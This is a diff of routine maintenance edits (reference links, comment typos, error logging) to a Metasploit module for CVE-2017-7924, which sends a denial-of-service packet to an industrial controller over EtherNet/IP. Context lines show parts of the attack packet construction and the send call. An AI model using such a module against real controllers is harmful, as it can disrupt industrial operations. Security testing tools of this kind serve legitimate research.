@@ -29,8 +29,8 @@ class MetasploitModule < Msf::Auxiliary
       'References'     =>
       [
         [ 'CVE', '2017-7924' ],
-        [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-138-03' ],
-        [ 'URL', 'http://dl.acm.org/citation.cfm?doid=3174776.3174780']
+        [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-138-03' ],
+        [ 'URL', 'https://dl.acm.org/doi/10.1145/3174776.3174780']
       ])
       register_options([Opt::RPORT(44818),])
   end
@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
   def enip_register_session_pkt
     # ENIP encapsulation Header
     "\x65\x00" + # Command register session (0x0065)
-    "\x04\x00" + # Lenght (4)
+    "\x04\x00" + # Length (4)
     "\x00\x00\x00\x00" + # Session handle (0x00000000)
     "\x00\x00\x00\x00" + # Status success (0x00000000)
     "\x00\x00\x00\x00\x00\x00\x00\x00" + # Sender context (0x0000000000000000)
@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
   def enip_ccm_forward_open_pkt(enip_session_handle)
     # ENIP encapsulation header
     "\x6f\x00" + # Send RR data (0x006f)
-    "\x3e\x00" + # Lenght (63)
+    "\x3e\x00" + # Length (63)
     enip_session_handle + # Session handle (retrieved from register session)
     "\x00\x00\x00\x00" + # Status success (0x00000000)
     "\x00\x00\x00\x00\x00\x00\x00\x00" + # Sender context (0x0000000000000000)
@@ -168,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
   rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
-    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+    elog(e)
   ensure
     disconnect
   end
@@ -202,7 +202,7 @@ class MetasploitModule < Msf::Auxiliary
     sock.put(pccc_dos_pkt(enip_session_id, cip_connection_id))
 
   rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
-    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+    elog(e)
   ensure
     disconnect
   end
